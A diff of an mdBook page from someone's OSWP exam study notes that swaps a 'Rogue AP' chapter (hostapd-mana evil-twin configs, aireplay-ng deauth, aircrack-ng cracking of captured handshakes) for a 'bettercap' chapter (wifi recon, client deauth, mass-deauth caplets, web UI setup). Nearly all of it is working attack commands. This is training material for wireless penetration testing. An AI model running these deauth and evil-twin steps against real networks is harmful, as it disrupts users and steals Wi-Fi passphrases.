@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Chapter 8 - Rogue AP - Brandon&#x27;s OSWP Notes</title>
+        <title>Chapter 10 - bettercap - Brandon&#x27;s OSWP Notes</title>
 
 
         <!-- Custom HTML head -->
@@ -88,7 +88,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CaptivePortal.html"><strong aria-hidden="true">8.1.</strong> Captive Portals</a></li></ol></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html" class="active"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="bettercap.html"><strong aria-hidden="true">12.</strong> Chapter 10 - bettercap</a></li><li class="chapter-item expanded "><a href="kismet.html"><strong aria-hidden="true">13.</strong> Chapter 11 - Kismet</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">14.</strong> Chapter 12 - Links</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CaptivePortal.html"><strong aria-hidden="true">8.1.</strong> Captive Portals</a></li></ol></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="bettercap.html" class="active"><strong aria-hidden="true">12.</strong> Chapter 10 - bettercap</a></li><li class="chapter-item expanded "><a href="kismet.html"><strong aria-hidden="true">13.</strong> Chapter 11 - Kismet</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">14.</strong> Chapter 12 - Links</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -173,202 +173,157 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="chapter-8---rogue-ap"><a class="header" href="#chapter-8---rogue-ap">Chapter 8 - Rogue AP</a></h1>
-<h2 id="my-notes"><a class="header" href="#my-notes">My Notes</a></h2>
-<h2 id="discovery"><a class="header" href="#discovery">Discovery</a></h2>
-<pre><code>sudo airodump-ng -w discovery --output-format pcap wlan0mon
+                        <h1 id="chapter-10---bettercap"><a class="header" href="#chapter-10---bettercap">Chapter 10 - bettercap</a></h1>
+<h2 id="start"><a class="header" href="#start">Start</a></h2>
+<pre><code>sudo apt install bettercap
 
-To get more information, let's open the output Pcap in Wireshark by running wireshark discovery-01.cap.
-
-To find the beacon for the target AP, we can use a filter to limit the types of packets displayed. First, we can display only beacon packets by using the filter:
-
-1) wlan.fc.type_subtype == 0x08. 
-	1) Management frames use "0" as the type and beacon frames are set to "8" as the subtype. 
-2) We can also only target the Mostar SSID by:
-	1) adding &amp;&amp; 
-	2) and using the filter wlan.ssid == "Mostar".
-</code></pre>
-<h2 id="attack"><a class="header" href="#attack">Attack</a></h2>
-<pre><code>
-cat Mostar-mana.conf
-
-interface=wlan0
-ssid=Mostar
-channel=1
-hw_mode=g
-ieee80211n=1
-wpa=3
-wpa_key_mgmt=WPA-PSK
-wpa_passphrase=ANYPASSWORD
-wpa_pairwise=TKIP CCMP
-rsn_pairwise=TKIP CCMP
-mana_wpaout=/home/kali/mostar.hccapx
-
-sudo hostapd-mana Mostar-mana.conf
-
-
-sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
-
-aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
-
-
+sudo bettercap -iface wlan0
 
 </code></pre>
-<hr />
-<h2 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h2>
-<h2 id="creating-a-rogue-ap"><a class="header" href="#creating-a-rogue-ap">Creating a Rogue AP</a></h2>
-<p>Evil twins can be in any channel, except if we clone the BSSID of the AP we want to impersonate, in which case the channel must be different. But APs with different BSSID and equal ESSID can coexist in the same channel.</p>
-<p>If we get a connection in an evil twin, the connected client won't have internet access if we don't give him an IP with a dhcp server.</p>
-<p><font color=red>with hostapd, we need to be listening with airodump (on another wifi interface) at the same time that we host the fake ap, to capture handshakes of clients that try to connect to us, despite the PSK mismatch (since we don't know the real PSK but will crack it from their handshake to us)</font></p>
-<p>Deauth a client if he doesn't connect to our AP
-<code>sudo aireplay-ng --deauth 4 -a &lt;bssid&gt; -c &lt;client_MAC&gt; wlan0mon</code></p>
-<h3 id="hostapd--hostapd-mana"><a class="header" href="#hostapd--hostapd-mana">hostapd / hostapd-mana</a></h3>
-<p>hostapd-mana is an enhanced version of hostapd. Both are used for hosting fake APs, but mana includes more options to do things like dump passwords obtained from the handshake. Hostapd-mana can read hostapd config files, but also includes other options</p>
-<p>Install</p>
-<pre><code class="language-bash">sudo apt install hostapd-mana
-sudo apt install hostapd-mana
-</code></pre>
-<p>Run</p>
-<pre><code class="language-bash">hostapd a.conf
-hostapd-mana a.conf
-</code></pre>
-<p>Parameters:</p>
-<ul>
-<li><code>driver=nl80211</code>  -&gt; always the same for all linux devices</li>
-<li><code>hw_mode=g</code> -&gt; 2.4 GHz  y 54 Mb</li>
-<li>auth_algs (this is for WEP, for WPA use the equivalent <code>wpa</code> parameter-&gt;
-<ul>
-<li><code>auth_algs=0</code> -&gt;OPEN</li>
-<li><code>auth_algs=1</code> -&gt;WEP</li>
-<li><code>auth_algs=2</code> -&gt; Both</li>
-</ul>
-</li>
-<li><code>wep_key0</code> &lt;- we can use up to 4</li>
-<li>Type of security
-<ul>
-<li><code>wpa=3</code> -&gt; activate both WPA and WPA2</li>
-<li><code>wpa=2</code> -&gt; activate only WPA2</li>
-<li><code>wpa=1</code> -&gt; activate only WPA</li>
-</ul>
-</li>
-</ul>
-<p>Type of authentication:</p>
-<ul>
-<li><code>wpa_key_mgmt=WPA-PSK</code></li>
-<li><code>wpa_passphrase=&lt;passphrase&gt;</code> -&gt; passphrase in the case of PSK auth, we can set anything here, we don't care it's wrong</li>
-</ul>
-<p>Encryption type (if the target is exclusiveliy WPA1 or WPA2 use just one of the following):</p>
-<ul>
-<li><code>wpa_pairwise=TKIP CCMP</code> -&gt; TKIP or CCMP encryption with WAP1</li>
-<li><code>rsn_pairwise=TKIP CCMP</code> -&gt; TKIP or CCMP encryption with WPA2</li>
-</ul>
-<p>- <code>mana_wpaout</code>-&gt; where to save the captured handshakes (in a Hashcat hccapx format).</p>
-<h4 id="hostap-with--no-encryption"><a class="header" href="#hostap-with--no-encryption">hostap with  no encryption</a></h4>
-<pre><code>interface=wlan1
-ssid=hostel-A
-hw_mode=g
-channel=6
-driver=nl80211
-</code></pre>
-<h4 id="hostap-with-wep"><a class="header" href="#hostap-with-wep">hostap with wep</a></h4>
-<pre><code>interface=wlan1
-hw_mode=g
-channel=6
-driver=nl80211
-ssid=hostel-A
-auth_algs=1
-wep_default_key=0
-wep_key0="54321"
-</code></pre>
-<h4 id="hostap-with-wpa-psk"><a class="header" href="#hostap-with-wpa-psk">hostap with WPA-PSK</a></h4>
-<pre><code>interface=wlan1
-hw_mode=g
-channel=6
-driver=nl80211
-ssid=HomeAlone
-auth_algs=1
-wpa=1
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP
-wpa_passphrase=welcome@123
-</code></pre>
-<h4 id="hostap-with-wpa2-psk"><a class="header" href="#hostap-with-wpa2-psk">hostap with WPA2-PSK</a></h4>
-<pre><code>interface=wlan1
-hw_mode=g
-channel=6
-driver=nl80211
-ssid=Lost-in-space
-auth_algs=1
-wpa=1
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=CCMP
-wpa_passphrase=beautifulsoup
+<h2 id="discover"><a class="header" href="#discover">Discover</a></h2>
+<pre><code>wifi.recon on
 
-# SSID 2
-bss=wlan1_0
-ssid=LOCOMO-Mobile-hotspot
-auth_algs=1
-wpa=1
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=CCMP
-wpa_passphrase=beautifulsoup
-</code></pre>
-<p>alternative</p>
-<pre><code>interface=wlan1
-hw_mode=g
-channel=6
-driver=nl80211
+wifi.recon.channel 6,11
 
-ssid=Lost-in-space
-auth_algs=1
-wpa=2
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-wpa_passphrase=beautifulsoup
-</code></pre>
-<h4 id="hosting-several-aps"><a class="header" href="#hosting-several-aps">Hosting several APs</a></h4>
-<p>Two different ESSIDs with the same wifi antenna (interface wlan1). With hostap, if we want to simulate several ESSIDs, the first one must use the keyword "interface" and the real interface name, and the next ones use the keyword "bss" and we use fictitious names, like wlan1_0. This can be used if a client probes different clients.</p>
-<pre><code># SSID 1
-interface=wlan1
-driver=nl80211
-ssid=dex-net
-wpa=2
-wpa_passphrase=123456789
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-channel=1
+set ticker.commands "clear; wifi.show"
 
-# SSID 2
-bss=wlan1_0
-ssid=dex-network
-wpa=2
-wpa_passphrase=123456789
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-channel=1
+wifi.recon on
+
+ticker on  
+
 </code></pre>
-<pre><code>interface=wlan0
-ssid=&lt;ESSID&gt;
-channel=1
-hw_mode=g
-ieee80211n=1
-wpa=3
-wpa_key_mgmt=WPA-PSK
-wpa_passphrase=ANYPASSWORD
-wpa_pairwise=TKIP
-rsn_pairwise=TKIP CCMP
-mana_wpaout=/home/kali/output.hccapx
+<h2 id="show-clients"><a class="header" href="#show-clients">Show Clients</a></h2>
+<pre><code>wifi.recon c6:2d:56:2a:53:f8
+
+wifi.show
+
+set wifi.show.filter ^c0
+
+wifi.show
+
+set wifi.show.filter ""
+
+set wifi.rssi.min -49
+
+wifi.show
+
+</code></pre>
+<h2 id="deauth-a-client"><a class="header" href="#deauth-a-client">DeAuth a client</a></h2>
+<pre><code>wifi.deauth c6:2d:56:2a:53:f8
+
+wifi.deauth ac:22:0b:28:fd:22
+
+wifi.recon off
+
+get wifi.handshakes.file
+
+set wifi.handshakes.file "/home/kali/handshakes/"
+
+set wifi.handshakes.aggregate false
+
+wifi.recon on
+
+wifi.deauth c6:2d:56:2a:53:f8
+
+wifi.deauth AA:BB:CC:DD:EE:FF
+
+set wifi.deauth.skip ac:22:0b:28:fd:22
+
+wifi.deauth c6:2d:56:2a:53:f8
+
+</code></pre>
+<h2 id="caplets"><a class="header" href="#caplets">Caplets</a></h2>
+<pre><code>cd /usr/share/bettercap/caplets/
+
+cat -n massdeauth.cap
+
+...
+ 1  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
+ 2
+ 3  # every 10 seconds deauth every client from every ap
+ 4  set ticker.period 10
+ 5  set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
+ 6
+ 7  # uncomment to only hop on these channels:
+ 8  # wifi.recon.channel 1,2,3
+ 9
+10  wifi.recon on
+11  ticker on
+12  events.clear
+13  clear
+...
+
+cat -n deauth_corp.cap
+
+...
+ 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
+ 2
+ 3  set ticker.period 10
+ 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
+ 5
+ 6  events.ignore wifi.ap.new
+ 7  events.ignore wifi.client.probe
+ 8  events.ignore wifi.client.new
+ 9
+10  wifi.recon on
+11  ticker on
+12  events.clear
+13  clear
+...
+
+
+sudo bettercap -iface wlan0 -caplet deauth_corp.cap
+
+</code></pre>
+<h2 id="web-interface"><a class="header" href="#web-interface">Web Interface</a></h2>
+<pre><code>sudo nft add table inet filter
+
+sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
+
+sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
+
+sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept
+
+cat -n /usr/share/bettercap/caplets/https-ui.cap
+
+...
+ 1	# api listening on https://0.0.0.0:8083/ and ui on https://0.0.0.0
+ 2	set api.rest.address 0.0.0.0
+ 3	set api.rest.port 8083
+ 4	set https.server.address 0.0.0.0
+ 5	set https.server.port 443
+ 6
+ 7	# make sure both use the same https certificate so api requests won't fail
+ 8	set https.server.certificate ~/.bettercap-https.cert.pem
+ 9	set https.server.key ~/.bettercap-https.key.pem
+10	set api.rest.certificate ~/.bettercap-https.cert.pem
+11	set api.rest.key ~/.bettercap-https.key.pem
+12	# default installation path of the ui
+13	set https.server.path /usr/share/bettercap/ui
+14
+15	# !!! CHANGE THESE !!!
+16	set api.rest.username offsec
+17	set api.rest.password wifu
+18
+19	# go!
+20	api.rest on
+21	https.server on
+...
+
+
+sudo bettercap -iface wlan0 -caplet https-ui
+
 </code></pre>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="WPAEnterprise.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="Wireshark.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
-                            <a rel="next prefetch" href="Wireshark.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next prefetch" href="kismet.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -378,11 +333,11 @@ mana_wpaout=/home/kali/output.hccapx
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="WPAEnterprise.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="Wireshark.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
-                    <a rel="next prefetch" href="Wireshark.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next prefetch" href="kismet.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
